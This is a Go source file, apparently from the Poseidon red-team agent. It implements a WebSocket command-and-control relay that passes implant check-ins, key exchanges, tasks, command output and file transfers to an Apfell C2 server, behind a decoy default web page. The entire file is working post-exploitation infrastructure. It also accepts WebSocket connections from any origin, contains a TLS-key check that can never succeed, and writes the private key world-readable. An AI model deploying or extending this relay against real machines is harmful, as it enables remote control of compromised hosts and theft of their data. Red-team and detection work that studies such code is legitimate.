package servers

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kabukky/httpscerts"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

type WebsocketC2 struct {
	PollInterval int
	BaseURL      string
	BindAddress  string
	SSL          bool
	SocketURI    string
	Defaultpage  string
	Logfile      string
	Debug        bool
}

var logger *log.Logger
var upgrader = websocket.Upgrader{}

func (s WebsocketC2) NewServer() Server {
	return &WebsocketC2{}
}

func (s *WebsocketC2) SetBindAddress(addr string) {
	s.BindAddress = addr
}

//PollingInterval - Returns the polling interval
func (s WebsocketC2) PollingInterval() int {
	return s.PollInterval
}

//SetPollingInterval - Sets the polling interval
func (s *WebsocketC2) SetPollingInterval(interval int) {
	s.PollInterval = interval
}

//ApfellBaseURL - Returns the base url for apfell
func (s WebsocketC2) ApfellBaseURL() string {
	return s.BaseURL
}

//SetApfellBaseURL - Sets the base url for apfell
func (s *WebsocketC2) SetApfellBaseURL(url string) {
	s.BaseURL = url
}

//SetSocketURI - Set socket uri
func (s *WebsocketC2) SetSocketURI(uri string) {
	s.SocketURI = uri
}

func (s WebsocketC2) GetNextTask(apfellID int) []byte {
	//place holder
	url := fmt.Sprintf("%sapi/v1.2/tasks/callback/%d/nextTask", s.ApfellBaseURL(), apfellID)
	return s.htmlGetData(url)
}

func (s WebsocketC2) PostResponse(taskid int, output []byte) []byte {
	urlEnding := fmt.Sprintf("api/v1.2/responses/%d", taskid)
	return s.postRESTResponse(urlEnding, output)
}

//postRESTResponse - Wrapper to post task responses through the Apfell rest API
func (s *WebsocketC2) postRESTResponse(urlEnding string, data []byte) []byte {
	size := len(data)
	const dataChunk = 512000 //Normal apfell chunk size
	r := bytes.NewBuffer(data)
	chunks := uint64(math.Ceil(float64(size) / dataChunk))
	var retData bytes.Buffer

	for i := uint64(0); i < chunks; i++ {
		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
		dataBuffer := make([]byte, dataPart)

		_, err := r.Read(dataBuffer)
		if err != nil {
			//fmt.Sprintf("Error reading %s: %s", err)
			break
		}

		tResp := structs.TaskResponse{}
		tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
		dataToSend, _ := json.Marshal(tResp)
		ret := s.htmlPostData(urlEnding, dataToSend)
		retData.Write(ret)
	}

	return retData.Bytes()
}

//htmlPostData HTTP POST function
func (s *WebsocketC2) htmlPostData(urlEnding string, sendData []byte) []byte {
	url := fmt.Sprintf("%s%s", s.ApfellBaseURL(), urlEnding)
	//log.Println("Sending POST request to url: ", url)
	s.Websocketlog(fmt.Sprintln("Sending POST request to: ", url))

	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
	contentLength := len(sendData)
	req.ContentLength = int64(contentLength)
	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		s.Websocketlog(fmt.Sprintf("Error sending POST request: %s", err.Error()))
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		s.Websocketlog(fmt.Sprintf("Did not receive 200 response code: %d", resp.StatusCode))
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		s.Websocketlog(fmt.Sprintf("Error reading response body: %s", err.Error()))
		return make([]byte, 0)
	}

	return body
}

//htmlGetData - HTTP GET request for data
func (s *WebsocketC2) htmlGetData(url string) []byte {
	//log.Println("Sending HTML GET request to url: ", url)
	client := &http.Client{}
	var respBody []byte

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		s.Websocketlog(fmt.Sprintf("Error creating http request: %s", err.Error()))
		return make([]byte, 0)
	}

	resp, err := client.Do(req)

	if err != nil {
		s.Websocketlog(fmt.Sprintf("Error completing GET request: %s", err.Error()))
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		s.Websocketlog(fmt.Sprintf("Did not receive 200 response code: %d", resp.StatusCode))
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	respBody, _ = ioutil.ReadAll(resp.Body)

	return respBody

}

func (s WebsocketC2) SendClientMessage(apfellID int, data []byte) {

}

func (s *WebsocketC2) SetDebug(debug bool) {
	s.Debug = debug
}

//GetDefaultPage - Get the default html page
func (s WebsocketC2) GetDefaultPage() string {
	return s.Defaultpage
}

//SetDefaultPage - Set the default html page
func (s *WebsocketC2) SetDefaultPage(newpage string) {
	s.Defaultpage = newpage
}

//SocketHandler - Websockets handler
func (s WebsocketC2) SocketHandler(w http.ResponseWriter, r *http.Request) {
	//Upgrade the websocket connection
	upgrader.CheckOrigin = func(r *http.Request) bool { return true }
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		s.Websocketlog(fmt.Sprintf("Websocket upgrade failed: %s\n", err.Error()))
		http.Error(w, "websocket connection failed", http.StatusBadRequest)
		return
	}

	s.Websocketlog("Received new websocket client")

	go s.manageClient(conn)

}

func (s *WebsocketC2) manageClient(c *websocket.Conn) {
	defer func() { _ = c.Close() }()
	var apfellid int

LOOP:
	for {
		// Wait for the client to send the initial checkin/EKE message
		m := Message{}
		err := c.ReadJSON(&m)

		if err != nil {
			s.Websocketlog(fmt.Sprintf("Error reading from websocket %s\n. Exiting session", err.Error()))
			return
		}

		switch m.MType {
		case CheckInMsg:
			// Forward the checkin data to apfell. This data should not be encrypted
			if m.Enc {
				s.Websocketlog("Warning: Received encrypted data for checkin. Exiting")
				break LOOP
			}

			resp := s.htmlPostData("api/v1.2/callbacks/", []byte(m.Data))

			// Create the msg to respond to the client
			re := Message{}
			re.Enc = false
			re.Data = base64.StdEncoding.EncodeToString(resp)
			re.MType = CheckInMsg

			// We don't need to set the ID or IDtype.

			if err = c.WriteJSON(re); err != nil {
				s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
				break LOOP
			}

			break

		case EKE:
			// Peform EKE with apfell
			if !m.Enc {
				s.Websocketlog("Warning: Received unencrypted data for EKE. exiting")
				break LOOP
			}

			if m.IDType == UUIDType {
				// Post the RSA Pub key to apfell and return the new AES key
				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/crypto/EKE/%s", m.ID), []byte(m.Data))
				if len(resp) == 0 {
					s.Websocketlog("Received empty response from apfell, exiting..")
					break LOOP
				}

				re := Message{}
				re.Enc = true
				re.Data = string(resp)
				re.MType = EKE

				if err = c.WriteJSON(re); err != nil {
					s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}
			}

			if m.IDType == SESSIDType {
				// Post the encrypted checkin data to apfell and return the checkin metadata
				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/crypto/EKE/%s", m.ID), []byte(m.Data))
				if len(resp) == 0 {
					s.Websocketlog("Received empty response from apfell, exiting..")
					break LOOP
				}

				re := Message{}
				re.Enc = true
				re.Data = string(resp)
				re.MType = EKE

				if err = c.WriteJSON(re); err != nil {
					s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}
			}

			break

		case AES:
			// Facilitate the AES checkin
			if !m.Enc {
				s.Websocketlog("Warning: Received unencrypted data for EKE. exiting")
				break LOOP
			}

			if m.IDType == UUIDType {
				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/crypto/aes_psk/%s", m.ID), []byte(m.Data))
				if len(resp) == 0 {
					s.Websocketlog("Received empty response from apfell, exiting..")
					break LOOP
				}

				re := Message{}
				re.Enc = true
				re.Data = string(resp)
				re.MType = AES

				if err = c.WriteJSON(re); err != nil {
					s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}
			}
			break

		case TaskMsg:
			// Handle task request from client
			if m.IDType == ApfellIDType {
				i, _ := strconv.Atoi(m.ID)
				apfellid = i
				resp := s.GetNextTask(i)

				if len(resp) == 0 {
					s.Websocketlog("Received empty response from Apfell.... retrying ")
					time.Sleep(time.Duration(s.PollingInterval()) * time.Second)

					resp = s.GetNextTask(i)
				}

				re := Message{}
				re.Data = string(resp)
				re.MType = TaskMsg

				if err = c.WriteJSON(re); err != nil {
					s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}

			}
			break

		case ResponseMsg:
			// Handle task responses
			if m.IDType == TASKIDType {
				i, _ := strconv.Atoi(m.ID)
				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/responses/%d", i), []byte(m.Data))

				re := Message{}
				re.Data = string(resp)
				re.MType = ResponseMsg

				if err = c.WriteJSON(re); err != nil {
					s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}
			}

			break

		case FileMsg:
			// Handle file uploads
			if m.IDType == FileIDType {
				i, _ := strconv.Atoi(m.ID)
				endpoint := fmt.Sprintf("api/v1.2/files/%d/callbacks/%d", i, apfellid)
				url := fmt.Sprintf("%s%s", s.ApfellBaseURL(), endpoint)
				resp := s.htmlGetData(url)

				re := Message{}
				re.Data = string(resp)
				re.MType = FileMsg

				if err = c.WriteJSON(re); err != nil {
					s.Websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}
			}

			break
		}
	}

}

//ServeDefaultPage - HTTP handler
func (s WebsocketC2) ServeDefaultPage(w http.ResponseWriter, r *http.Request) {
	log.Println("Received request: ", r.URL)

	if r.URL.Path == "/" && r.Method == "GET" {
		// Serve the default page if we receive a GET request at the base URI
		http.ServeFile(w, r, s.GetDefaultPage())
		return
	}

	http.Error(w, "Not found", http.StatusNotFound)
	return
}

//Run - main function for the websocket profile
func (s WebsocketC2) Run(config interface{}) {
	cf := config.(WsConfig)
	if cf.Debug {
		f, err := os.Create(cf.Logfile)
		if err != nil {
			log.Println("Failed to create log file for websockets server")
			return
		}

		logger = log.New(f, "poseidon-websocket: ", log.Lshortfile|log.LstdFlags)
	}

	s.SetDefaultPage(cf.Defaultpage)
	s.SetApfellBaseURL(cf.BaseURL)
	s.SetBindAddress(cf.BindAddress)
	s.SetSocketURI(cf.SocketURI)

	// Handle requests to the base uri
	http.HandleFunc("/", s.ServeDefaultPage)
	// Handle requests to the websockets uri
	http.HandleFunc(fmt.Sprintf("/%s", s.SocketURI), s.SocketHandler)

	// Setup all of the options according to the configuration
	if !strings.Contains(cf.SSLKey, "") && !strings.Contains(cf.SSLCert, "") {

		// copy the key and cert to the local directory
		keyfile, err := ioutil.ReadFile(cf.SSLKey)
		if err != nil {
			log.Println("Unable to read key file ", err.Error())
		}

		err = ioutil.WriteFile("key.pem", keyfile, 0644)
		if err != nil {
			log.Println("Unable to write key file ", err.Error())
		}

		certfile, err := ioutil.ReadFile(cf.SSLCert)
		if err != nil {
			log.Println("Unable to read cert file ", err.Error())
		}

		err = ioutil.WriteFile("cert.pem", certfile, 0644)
		if err != nil {
			log.Println("Unable to write cert file ", err.Error())
		}
	}

	if cf.UseSSL {
		err := httpscerts.Check("cert.pem", "key.pem")
		if err != nil {
			s.Websocketlog(fmt.Sprintf("Error for cert.pem or key.pem %s", err.Error()))
			err = httpscerts.Generate("cert.pem", "key.pem", cf.BindAddress)
			if err != nil {
				log.Fatal("Error generating https cert")
				os.Exit(1)
			}
		}

		s.Websocketlog(fmt.Sprintf("Starting SSL server at https://%s and wss://%s", cf.BindAddress, cf.BindAddress))
		err = http.ListenAndServeTLS(cf.BindAddress, "cert.pem", "key.pem", nil)
		if err != nil {
			log.Fatal("Failed to start raven server: ", err)
		}
	} else {
		s.Websocketlog(fmt.Sprintf("Starting server at http://%s and ws://%s", cf.BindAddress, cf.BindAddress))
		err := http.ListenAndServe(cf.BindAddress, nil)
		if err != nil {
			log.Fatal("Failed to start raven server: ", err)
		}
	}
}

//Websocketlog - logging function
func (s WebsocketC2) Websocketlog(msg string) {
	if logger != nil {
		logger.Println(msg)
	}
}
